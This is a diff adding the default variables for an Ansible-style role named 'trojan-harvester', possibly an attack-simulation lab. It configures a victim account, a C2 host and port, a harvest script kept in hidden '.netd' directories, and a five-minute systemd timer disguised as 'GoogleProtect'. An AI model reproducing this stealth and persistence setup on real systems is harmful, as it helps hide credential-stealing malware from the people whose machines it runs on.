@@ -1,0 +1,11 @@
+---
+# defaults file for trojan-harvester
+
+victim_user: cyrano
+c2_host: c2-server
+c2_port: 80
+harvest_schedule: "*:0/5"
+harvest_script_path: /usr/local/lib/.netd/harvester.sh
+harvest_log: /var/lib/.netd/harvest.log
+harvest_timer_unit: "GoogleProtect.timer"
+harvest_service_unit: "GoogleProtect.service"
